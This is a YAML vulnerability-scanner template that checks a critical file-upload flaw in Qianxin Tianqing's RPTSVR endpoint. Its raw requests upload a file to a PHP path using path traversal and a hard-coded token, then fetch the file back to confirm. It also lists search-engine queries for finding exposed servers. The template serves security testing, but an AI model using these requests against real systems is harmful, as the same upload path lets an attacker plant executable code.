id: qianxin-tianqing-rptsvr-fileupload

info:
  name: 奇安信天擎 RPTSVR 文件上传漏洞
  author: zan8in
  severity: critical
  description: |
    Hunter: web.title=="360新天擎" || web.title=="360天擎终端安全管理系统"
    Fofa: "奇安信天擎"
  reference:
    - https://mp.weixin.qq.com/s/CkvAaxQThv_33e_CG9Md5w
  tags: qianxin,tianqing,fileupload
flow: |
  http("r0") && http("r1")

variables:
  randstr: rand_base(20)
  randbody: rand_base(32)
  rboundary: rand_base(8)

http:
  - id: "r0"
    raw:
      - |
        POST /rptsvr/upload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}

        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="uploadfile";filename="../../../application/api/controllers/{{randstr}}.php"
        Content-Type: text/x-python
        
        {{randbody}}
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="token"
        
        skylar_report
        ------WebKitFormBoundary{{rboundary}}--
        

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
        internal: true
        condition: and

  - id: "r1"
    raw:
      - |
        GET /application/api/controllers/{{randstr}}.php HTTP/1.1
        Host: {{Hostname}}

        

    matchers:
      - type: dsl
        dsl:
          - contains(body,"{{randbody}}")
        condition: and

